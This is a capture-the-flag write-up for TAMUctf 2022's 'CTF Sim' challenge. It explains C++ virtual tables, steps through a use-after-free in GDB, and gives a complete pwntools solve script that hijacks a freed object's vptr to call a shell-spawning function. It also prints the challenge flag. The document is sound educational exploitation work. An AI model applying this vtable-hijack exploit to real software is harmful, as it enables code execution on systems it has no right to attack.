---
title: TAMUctf 2022 – CTF Sim
excerpt: Oops, your vpointer was redirected.
tags: 
  - pwn
  - python
  - cpp
  - programming
thumbnail_src: assets/ctf-sim-thumbnail.jpg
keywords: [vpointer, vptr, ctf, virtual function, vtable, gdb]
---

### Challenge Description
> Wanna take a break from the ctf to do another ctf?

### Write-Up
Ooooh, a C++ challenge. And it's about CTFs. Seems like a fun little exercise.

#### Preliminary Observations and Analysis
We're provided a C++ file and its compiled ELF. Upon an initial browse through the source, we see something interesting:

```cpp
void win() {
    system("/bin/sh");
}

void* win_addr = (void*)&win;
```

A `win` function is already provided, along with a global variable `win_addr` storing the address of `win`.

Now on to the fun stuff. We're given six classes with the `solve` virtual function: one base class and the other five inheriting and overriding `solve`.

```cpp
struct challenges { virtual void solve() { /* ... */ } };
struct forensics : challenges { virtual void solve() { /* ... */ } };
struct reversing : challenges { virtual void solve() { /* ... */ } };
struct pwn : challenges { virtual void solve() { /* ... */ } };
struct web : challenges { virtual void solve() { /* ... */ } };
struct crypto : challenges { virtual void solve() { /* ... */ } };
```

We then have three action functions:

1. `downloadChallenge`, which `new`s one of the five derived classes,
    ```cpp
    // -- Read choice, index from input. --
    if (choice == 1) {
        downloaded[index] = new forensics;
    }
    else if (choice == 2) {
        downloaded[index] = new reversing;
    }
    // ...
    else {
        downloaded[index] = new crypto;
    }
    ```
2. `solveChallenge`, which selects a downloaded challenge, then calls `->solve()` and `delete`s it,
    ```cpp
    // -- Read index from input. --
    downloaded[index]->solve();
    delete downloaded[index];
    ```
    and
3. `submitWriteup`, which calls `malloc`s with custom size.
    ```cpp
    // -- Read length from input. --
    char* writeup = (char*)malloc(length);
    fgets(writeup, length, stdin); // Read writeup payload from input.
    ```

Interestingly, the `malloc`ed chunk isn't `free`d anywhere! Also in `solveChallenge`, the value of `downloaded[i]` isn't removed after being `delete`d... This is starting to smell like a [double free][doublefree] or use-after-free vulnerability. But is it?

Let's start by defining helper functions in Python to help us perform actions:

```py
def download_chal(category: int, save_index: int):
    if not (1 <= category <= 5 and 0 <= save_index <= 3):
        raise RuntimeError("bad bad")

    p.sendlineafter(b"> ", b'1')
    p.sendlineafter(b"> ", str(category).encode())
    p.sendlineafter(b"> ", str(save_index).encode())

def solve_chal(index: int):
    if not (0 <= index <= 3):
        raise RuntimeError("bad bad")
    
    p.sendlineafter(b"> ", b'2')
    p.sendlineafter(b"> ", str(index).encode())

def submit_writeup(content: bytes, length: int = None):
    if length is None:
        length = len(content) + 1
    elif len(content) >= length:
        raise RuntimeError("your math bad bad")
    
    if b'\n' in content:
        raise RuntimeError("bad bad newline")

    p.sendlineafter(b"> ", b'3')
    p.sendlineafter(b"> ", str(length).encode())
    p.sendlineafter(b"> ", content)
```

Now we just need to figure out how to call these, and what to call them with...

#### Virtual Tables
Ugh... virtual functions. They're convenient high-level features and great for polymorphism, but how do they actually work underneath?

My Google-fu did not fail me. I found a couple useful resources:

* a [StackOverflow answer][vtable-so]
* a [well-written blog post][vtable-pablo] by one named Pablo

I'll try my best to summarise the wisdom found there:

* If a class has a virtual function...
  * the class has a vtable, and
  * objects of the class contains an *implicit* "vptr" member.
    * In memory, the vptr is placed at the *very beginning* of the object.
    * The vptr points to the vtable of the class.
* The vtable is a list of pointers to the concrete implementations of the virtual functions.
* When a virtual function is called, the vtable is accessed through the vptr. The vtable is then used to **look up** the appropriate virtual function and pass it the appropriate parameters.

To better understand vtables and vpointers, here's a virtual function example in C++ along with a desugared version written in C.

C++ Version:

```cpp
class Parent {
public:
    // void* vtable; // Implicit, but exists due to virtual functions.
    int parent_data;
    Parent(int data) : parent_data{data} {}

    virtual void foo(int x) { std::cout << "parent (" << parent_data << ") foo: " << x << std::endl; }
    virtual void bar(int x) { std::cout << "parent (" << parent_data << ") bar: " << x << std::endl; }
};

// Inherits Parent::parent_data and Parent::foo.
class Derived : public Parent {
public:
    // void* vtable; // Implicit for same reason as Parent.
    int derived_data;
    Derived(int data, int data2) : Parent{data}, derived_data{data2} {}

    // Overrides Parent::bar.
    virtual void bar(int x) { std::cout << "derived (" << parent_data << ", " << derived_data << ") bar: " << x << std::endl; }
};

int main() {
    Parent p{1};
    p.foo(2); // Parent::foo
    p.bar(3); // Parent::bar

    Derived d{5, 6};
    d.foo(7); // Parent::foo
    d.bar(8); // Derived::bar
}
```
<sup>([godbolt demo][gb-vtable-cpp])</sup>


C Version:

```c
typedef void (*funcptr_t)(); // Type alias for function pointers.

typedef struct {
    funcptr_t* vtable;
    int parent_data;
} Parent;

typedef struct {
    funcptr_t* vtable;
    int parent_data; // Inherited from Parent.
    int derived_data;
} Derived;

// Enumeration of virtual functions.
enum { VFUNCTION_FOO, VFUNCTION_BAR };

// Concrete implementations.
void parent__foo(Parent* p, int x) { printf("parent (%d) foo: %d\n", p->parent_data, x); }
void parent__bar(Parent* p, int x) { printf("parent (%d) bar: %d\n", p->parent_data, x); }
void derived__bar(Derived* d, int x) { printf("derived (%d, %d) bar: %d\n", d->parent_data, d->derived_data, x); }

// Virtual implementations (redirect).
void foo(Parent* p, int x) { p->vtable[VFUNCTION_FOO]((void*)p, x); }
void bar(Parent* p, int x) { p->vtable[VFUNCTION_BAR]((void*)p, x); }

// vtable definitions.
funcptr_t parent__vtable[] = {
    parent__foo,
    parent__bar,
};

funcptr_t derived__vtable[] = {
    parent__foo,
    derived__bar,
};

int main(void) {
    Parent p = {parent__vtable, 1};
    foo(&p, 2); // parent__foo
    bar(&p, 3); // parent__bar.

    Derived d = {derived__vtable, 5, 6};
    foo((Parent*)&d, 7); // parent__foo
    bar((Parent*)&d, 8); // derived__bar.
}
```
<sup>([godbolt demo][gb-vtable-c], inspired from [this gist](https://gist.github.com/michahoiting/1aec1c95881881add9a20e9839c35cec))</sup>

So to reiterate and relate how this works with ctf_sim.cpp:

* By observation, each class (`challenge`, `forensic`, `reversing`, etc.) has a virtual function.
* Therefore, each class has a vtable.
* Also, an object of any class (`challenge`, `forensic`, etc.) has a vptr.
* This vptr points to the corresponding vtable of the class.
  * e.g. a `forensic` object will have a vptr pointing to the `forensic` vtable.
  * a `pwn` object will have a vptr pointing to the `pwn` vtable.


#### Exploiting the Binary with GDB
This section will walk through the hands-on aspect exploiting the `ctf_sim` binary using GDB. I try to go through the entire procedure to clarify the details, so it may be slightly long-winded. Feel free to skip to the [conclusion](#altogether).

To recap a bit, we know that...

* when a virtual function is called, the function does a little double-dereference magic using the object's vptr.
* there is a use-after-free/double-free vulnerability.
  * When solving a challenge, `delete` is called. But the pointer value isn't cleared.
    ```cpp
    int main() {
        int* p = new int;
        // Suppose p == 0x404000.
        delete p;
        // Pointer value is still 0x404000, not NULL or anything else.
    }
    ```
  * We could...
    * make a new challenge at the same index? This would overwrite our use-after-free pointer... we probably don't want that.
    * solve the challenge again? This would call the virtual function and delete the pointer again.
    * submit a writeup? We might be able to use this to reallocate the chunk and overwrite object data with custom data! Let's explore this a bit more using GDB.

We'll try the following:

1. Download challenge. This allocates a new chunk.
2. Solve the downloaded challenge. This should free the chunk.
3. Submit a writeup. This should reallocate the chunk, but with our custom data.
4. Solve the downloaded challenge again. This should call a double deref on the vptr.

To understand the exploit the details better and what happens under the hood, we'll use GDB to step through the exploit.

A brief refresher on some commands we'll be using. (See this [GDB cheatsheet](/posts/gdb-cheatsheet/) for more commands.)
```sh {data-language=GDB}
r               # Run the file.
c               # Continue running where we left off.
heap chunks     # View active chunks on the heap.
x /40wx <addr>  # View memory at address as hex data.
x /40wi <addr>  # View memory at address as instructions.
disas <sym>     # Disassemble a symbol.
b *<addr>       # Set a breakpoint at the specified address.
kill            # Useful for stopping the current run in case we make an oopsie and need to restart.
```

After starting up my Kali Linux VM, downloading the challenge onto it, and firing up GDB; we inspect the initial state of the heap.
```sh {.command-line data-prompt="$" data-continuation-prompt="gef>" data-continuation-str="  "}
gdb ctf_sim  
r  
^C  
heap chunks  
```

{% image "assets/ctf-sim-1-heap-init.jpg", "" %}

Ooo, looks a bit busy, even though we haven't `malloc`ed or `new`ed anything yet! These are probably allocations from iostream buffers used to buffer the input and output streams. We'll ignore these for now as they aren't very important.

We perform our first action: downloading a challenge. The challenge type and index to store the challenge don't really matter, so we'll just go with the first option (`new forensics`) and index 0.

```sh {data-language=GDB .command-line data-prompt="gef>" data-continuation-prompt=">" data-continuation-str="  "}
c  
1  
1  
0
```

{% image "assets/ctf-sim-2-input-1.jpg", "" %}

Let's pause again and check the state of the heap.

```sh {data-language=GDB .command-line data-prompt=">" data-continuation-prompt="gef>" data-continuation-str="  "}
^C  
heap chunks
```

{% image "assets/ctf-sim-3a-heap-after-input-1.jpg", "" %}

Notice that there is now a new chunk with size `0x20` with some data in the first few bytes. Since we just allocated a `forensics` object, this is likely the vptr of that object.

Indeed, if we peek into the binary's memory using `x /20wx 0x403d38`, we see what looks like some vtables having a party:

{% image "assets/ctf-sim-3b-vtables-party.jpg", "" %}

We'll move on to the second step: solving the challenge. This step is rather simple, but I want to show how the vtable magic is done in assembly. Let's disassemble the `solveChallenge()` function and set a breakpoint near the hotspot.

```sh {data-language=GDB .command-line data-prompt="gef>" data-continuation-prompt=">" data-continuation-str="  "}
disas solveChallenge
b *solveChallenge+191
```

{% image "assets/ctf-sim-4a-disas-1.jpg", "jw-95", "" %}

{% image "assets/ctf-sim-4b-disas-2.jpg", "jw-95", "" %}

Now we'll continue running and feed it input for solving our `forensics` challenge.
```sh {data-language=GDB .command-line data-prompt="gef>" data-continuation-prompt=">" data-continuation-str="  "}
c  
2  
0
```
Our breakpoint gets triggered. Notice the interesting chain of addresses in the `rax` register in the image below. There's a chain of 3 addresses:

1. the address of the `forensics` object vptr... which points to...
2. the address of the `forensics` vtable... which points to...
3. the address of `forensics::solve`...
    * which is eventually called in assembly (`call rax`)

{% image "assets/ctf-sim-4c-double-deref-in-first-solve.jpg", "jw-85", "" %}

So *this* is what happens when we call a virtual function... InTeReStInG!

{% image "~/assets/img/memes/interesting.jpg", "jw-65", "" %}

Let's continue so that it finishes `delete`-ing the chunk, and let's check the heap state again:

```sh {data-language=GDB .command-line data-prompt="gef>" data-continuation-prompt=">" data-continuation-str="  "}
c  
^C
heap chunks
```

{% image "assets/ctf-sim-5-heap-after-input-2.jpg", "" %}

It appears that our `forensics` vptr has been replaced with some other data. 😢 But no worries! We'll just continue with our third action: submitting a writeup.

Since we want to reuse the chunk previously deallocated, we want to make sure the chunk we allocate when submitting the writeup isn't too big. But the chunk shouldn't be too small either: we want it to be at least 9 bytes, so that it could fit 8 bytes of payload plus a null terminator. So we'll settle for 16 bytes.

```sh {data-language=GDB .command-line data-prompt="gef>" data-continuation-prompt=">" data-continuation-str="  "}
c  
3  
16  
AABBCCDD
```

{% image "assets/ctf-sim-6-input-3.jpg", "" %}

Let's check our heap.
```sh {data-language=GDB .command-line data-prompt=">" data-continuation-prompt="gef>" data-continuation-str="  "}
^C  
heap chunks
```

{% image "assets/ctf-sim-7-heap-after-input-3.jpg", "" %}

Sweet! We've overwritten the first 8 bytes of the chunk with our payload. Effectively, we've assigned a custom vptr to the `forensics` object.

"But bruh I thought our `forensics` object was deallocated!"

Well yes... but actually no... Objects in C/C++ are merely represented in memory as a sequence of bytes. You can interpret a sequence of bytes as any type. That's why casting across types is a thing in C/C++—albeit potentially dangerous. (In C, you'd use the usual cast `(type*)&obj`. In C++, you'd use `reinterpret_cast<type*>(&obj)`.)

Now when we call `solveChallenge`, the line `downloaded[index]->solve()` will treat our chunk as a `challenge*`. It was originally *supposed* to be a `char*`, since we submitted a writeup. But since types don't matter in the assembly/memory level, the chunk is now a `challenge*` for all intents and purposes.

Since the chunk is treated as a `challenge*`, the assembly will try to double-deref the vptr... which is our payload from submitting the writeup.

Boom! Exploit.

If we continue running the program, a SIGSEGV occurs since it tries to dereference `0x4444434342424141` (which is `"AABBCCDD"`, but packed to 64 bits).

{% image "assets/ctf-sim-9-sigsev.jpg", "" %}

Later on, we'll use `win_addr` instead of `"AABBCCDD"` for our payload; so that when the `solve()` virtual function does its magic, it will call `win()` instead.

#### Altogether
Combining our knowledge of vtables/vpointers with a little bit of heap knowledge, we come up with the following exploit:

```py 
# downloaded[0] = new forensics;   (vptr points to forensic's vtable.)
download_chal(1, 0)

# delete downloaded[0];    (chunk is moved to tcache/fast bin. downloaded[0] itself is unchanged!)
solve_chal(0)

# Chunk is allocated-- reusing the chunk previously deallocated.
# Overwrite vptr of downloaded[0] with &(&win).
submit_writeup(p64(elf.sym['win_addr']), 0x10)

# downloaded[0]->solve() triggers double dereference (due to virtual function resolution) and calls win()!
solve_chal(0)
```

To explain the "little bit of heap knowledge", we just need to understand that C++'s `new`/`delete` behaves like C's `malloc`/`free`: `new` will allocate a chunk, and `delete` will move the chunk to a bin. There are tons of different bins (small, large, fast, unsorted). But intuitively, the next `new` with a similar chunk size will reuse the chunk, meaning we overwrite the same memory previously allocated!

This story is reflected in the code above.

* We download a challenge. This will `new` a chunk. The index and type of challenge (`forensic`, `pwn`, etc.) don't really matter, but just make sure we keep reusing the same index.
* We solve a challenge. Here we `delete` the chunk previously allocated.
* We submit a writeup. This `malloc`s a chunk and inserts a payload of `win_addr`.
  * The size to malloc can be anywhere between `0x8` (exclusive) and `0x18` (inclusive). I used `0x10` since it looks pretty.
  * Anything equal or less than `0x8` means our 8-byte payload will be cut off early. All 8 bytes are important, because the vptr machinery will be using the entire 8 bytes.
  * Anything above `0x18` will allocate a new chunk instead of reusing the previously deallocated chunk.
* We solve the same challenge as before. This triggers a call to a virtual function which double-derefs our payload (`win_addr`), calling `win()` and giving us a shell. PROFIT!

### Solve Scripts
```py
from pwn import *

binary = 'ctf_sim'

context.binary = binary
context.log_level = 'debug'

elf = ELF(binary)
rop = ROP(binary)

p = remote("tamuctf.com", 443, ssl=True, sni="ctf-sim")


def download_chal(category: int, save_index: int):
    if not (1 <= category <= 5 and 0 <= save_index <= 3):
        raise RuntimeError("bad bad")

    p.sendlineafter(b"> ", b'1')
    p.sendlineafter(b"> ", str(category).encode())
    p.sendlineafter(b"> ", str(save_index).encode())

def solve_chal(index: int):
    if not (0 <= index <= 3):
        raise RuntimeError("bad bad")
    
    p.sendlineafter(b"> ", b'2')
    p.sendlineafter(b"> ", str(index).encode())

def submit_writeup(content: bytes, length: int = None):
    if length is None:
        length = len(content) + 1
    elif len(content) >= length:
        raise RuntimeError("your math bad bad")
    
    if b'\n' in content:
        raise RuntimeError("bad bad newline")

    p.sendlineafter(b"> ", b'3')
    p.sendlineafter(b"> ", str(length).encode())
    p.sendlineafter(b"> ", content)

# downloaded[0] = new forensics;   (vptr points to forensic's vtable.)
download_chal(1, 0)

# delete downloaded[0];    (chunk is moved to tcache/fast bin. downloaded[0] itself is unchanged!)
solve_chal(0)

# Chunk is allocated-- reusing the chunk previously deallocated.
# Overwrite vptr of downloaded[0] with &(&win).
submit_writeup(p64(elf.sym['win_addr']), 0x10)

# downloaded[0]->solve() triggers double dereference (due to virtual function resolution) and calls win()!
solve_chal(0)

p.interactive()
```

### Flag
```text {data-lang-off}
gigem{h34pl355_1n_53477l3}
```

[doublefree]: https://web.archive.org/web/20231001021419/https://heap-exploitation.dhavalkapil.com/attacks/double_free
[vtable-so]: https://stackoverflow.com/a/99341/10239789
[vtable-pablo]: https://pabloariasal.github.io/2017/06/10/understanding-virtual-tables/
[gb-vtable-cpp]: https://godbolt.org/#z:OYLghAFBqd5QCxAYwPYBMCmBRdBLAF1QCcAaPECAMzwBtMA7AQwFtMQByARg9KtQYEAysib0QXACx8BBAKoBnTAAUAHpwAMvAFYTStJg1DIApACYAQuYukl9ZATwDKjdAGFUtAK4sGIM6SuADJ4DJgAcj4ARpjE/gDspAAOqAqETgwe3r7%2ByanpAiFhkSwxcWaJdpgOGUIETMQEWT5%2BAVU1AnUNBEUR0bEJtvWNzTltwz2hfaUDFQCUtqhexMjsHOYAzKHI3lgA1CYbbk4KBMSYrIfYJhoAgje3O0wKCnvKDYwEB/FWd0leUVoeGQIAee3Be1CXySH0EAH10Ex6odfrcIW9YQQIFC9oj6nM9iA9jDzvC8UwTD9yZSACLfKzxGkPMEQgBueEaXjEe1ZqDw6D2/FQ2MEe1UBMpFj2p3QIBQSy%2BhzcSoOZjMJM%2Bewg5jMByOKo1ZKRTD1yqOqrMBKFRJ1ppVqjt5plctctBR3yZd3R7M53N5/L2UQaIq%2B4vp0oIsvlXkV%2BvNOsNX21asdbmJmIRxtTFoJQbiFuzDqVKudIFd7tpzMZKIeTxeexpsTwrMwAqJ/0BwIxpMVPweHaBIJZ4JxWGIzdbmeRG1R6Mb45b6BDuONpEhovJlsJ3c%2BkupjLXY4n6CnFKpxrMtPplbuw55HIIXNoPL5Arzy7DkojUbQMezOqPRctVtYtzUTU9/zVNcQLjNNAMnclIK3PMbRTUC0yLWDvxdBh0DdGcPSrJkZ2ZO4cRYJhQggCU%2By9CF3h7YlJS4SsSLo8EkgAOiFCBLXdAB6fid0EOUhTvLj3w2OYBKEhjPjlPNSLRCF52PXFJQAVjXAA2VjZwhdBuNQYV4mkgjBOEghROMu9DPfAAOMypQs1TFwUhoiI4BZaE4DTeD8DgtFIVBOGVSxrGlJYVkwVUNh4UgrMCryFgAaxADSNH0ThJH8zReBCjheAUEBMsSrQFjgWAYEQeUWCSOhYnISg0Dqhq4mALgzC4Pg6AIWJiogKI8tIKJQgaABPTh4pathBAAeQYWhJqS0gsAooxxBW/BzhqFtipWzBVGqGM1iCqFMB8lagSiYgJo8LBhrOPAWCmry%2BAMYAFAANTwTAAHc5qSRhXpkQQRDEdgpFB%2BQlDUYbdG6gwjBQaxrH0PAomKyAFlQJJHAEfaiou6p8b8CBXFGPxuuCKYSjKPQUjSUnKYZ/JSd6OmBm69pSa6EZPBaPQedqCYOf6OJuYmFnJe6MWZglhYFCi1Y9DOTA1h4bzfNylaCtUeztIAWm0yQ9mAZBkD2TrOK4LUwqsSw11wQgSFi7q9g8Vr6GIN25l4MrktINKMqyjgctIF6Q4CoKCqKkqEryirqogJAFX%2BAgmogFr6u98JWDWfWjZNs2Latswbd4VsXfHWVuv4MHRHEKH65hlR1BWhHSD%2B26klerWOD80ho/yzg5pjdO9lQKgxQN43TfNy3rdtiBPZz2Jff9xOFgQC4x0ofvw8jzLh%2BCzg49Kreg/SzLLo2HWY7PhOkrmfuzHvkfCqf8qFhbYg0mcSQQA
[gb-vtable-c]: https://godbolt.org/#z:OYLghAFBqd5QCxAYwPYBMCmBRdBLAF1QCcAaPECAMzwBtMA7AQwFtMQByARg9KtQYEAysib0QXACx8BBAKoBnTAAUAHpwAMvAFYTStJg1AB9U8lJL6yAngGVG6AMKpaAVxYMQAJgDMpBwAyeAyYAHLuAEaYxN4AHKQADqgKhLYMzm4e3n5JKTYCQSHhLFExXvGWmNZpQgRMxAQZ7p6%2BFphW%2BQy19QSFYZHRcRZ1DU1ZrQojvcH9JYPlAJQWqK7EyOwcAKS%2BwchuWADUmz6Ok/ioAHQIx9ibGgCCd/cEAJ4JmFhUBwBuqHjoBwgACoqK4GMgEgRiMYCAsIAtjgAhA4AehRBwAKm9MAcxHgmAoDvxiESwdUBAcksECNEFBcnk9Xu9PgdJsRXNYjgB2RFPA780ngyHQghAn51CL0JF8gXUyn1RgEYzoJh1aUPTZcgAiB2UCsE6seDyZH0wXzZHII3N5DwFgohUJhYu%2BEqlPht9ztcoS%2BqVKrV7tR6IAkgwENFCB8icRUCx5cRFfTbbLBAcsMQ8N8PsrVUxDZqdVqI1n0PmHmiDtgGO5oqq0gdUF9vngGq4xPbOnSnox3NaDgA1ABiclCjgxwYA8qFjIOJxPSAPh6Px1PjIj7gAlblasv3CvOcEJmkHPAsBL0NiCOsCLsPX7/eOK0z8VAQPUJwRihILuWqBZ9hIM0EKgIG2LwfQ/K1QK8ABWdB/xfEAjlg0sYMcBgwIXBIAFobggp9/SYBc/yRbcnnvAF8MEUwInqN9fS/H9Uz/ACgIIECwKoqDtjg/9aJiZC4M2NCMK8LwsNwnxsC4nM6mIhFAwLci/gBdNM2zYx%2BIgIsMxLMV0CYq0WM1ZFAOpDixLUktAR4gzBPgg5%2BKQ2zhPQzC00k6TfVkoiPJuKzs0I%2BTSKUjVy3RfsWwINtaBPM8L0Va8GEJCAE3wBNrAWJN7goolUFfd9FUYk9mP/EzKU8l0mElTBhMRIcRzHSdp1nCdhK1KAKKBBZvwOEjFO1ZSHy0wrP0pQy%2BrKnkKpuKqarqhrl2atdN3azqVO63r%2BuRUKjT3dE5voNMzWCVIb2y0EhUdK0ZOMQ7apg3kYJ1Y4Xp5GV%2BVul9SA%2Bx9qM0%2Bofo1Qb3QZB5LodEVjt0jT7rq9qjh8N6PTtL78qBz0BQC9AaMBhkQY9J45RYJhgggCippRgVRpuxHkdu%2B6Fy4JTQeTfkX2ggA2XqvAU5EKzR1Bfq07ZuYXHw%2BaDP6lQB4hst%2BnT1NUunrWx0xGYOGCF05lmqfZ/KoBp7rRbsrlJYF7zjBfYW6PoyDja8Tm7Nic30TV2X5e1DglloTgYN4TwOC0UhUE4RxWRWNYcW2HweFIAhNG9pYAGsQBgjR9E4SQA8TkPOF4BQQAzhOg%2B90g4FgGBEBQWMEjoaJyEoNAz3rmJkGALgvC4Pg6BpYhC4gCJc4iYJ6heTg4%2Bby8CAnBhaHH0vSCwEmjHERf0qqGws0LxfMFUKpXBpXPqXaXPaDwCJiDH5wsFzqFTwnsuqAMYAFEizAAHcJ3eQO4/4QQRBiHYFIGQghFAqHUIvXQ3cDBGBAKYYw5hz4RELpAJYqBIRpB3gXdom80j2AYE4FwzQ9CBBmMUUoehchnXSMQrI3dqGdD6BQwY3dKjki6FMMYng2G4I4d0BozCBgxDYVwuhPDhg9CEXMERSwFCR3WHoKEmANg8B9n7HOi9Q4cFULETm2FOaSAOMAZAyADidwuFwQEjgFy4EICQZCscFzOBbvQEkMcuALF4CXLQCwU5pwzr7Dg2dSAsACaQQOwdtEFyLvHROSwK7VxWAQBIh9G4QGbnXNxoRWAbF0fowxxjTHmK8JY3gHx7EZnQHof%2BwhRDiBAbU8Bahc7QNIB/K%2BCRH7qI4P7CJudtETkPqkq0jY%2Bp6IMUYkxZiLFWIgC4rJ0RHGeO8fEpY4YmDpkoD0kJYT079K0fnCwsSfFJ1IKnfZQSfCaKiUc05fjM4cC8Dc3g0S4mlweVmfu%2BDJBAA%3D
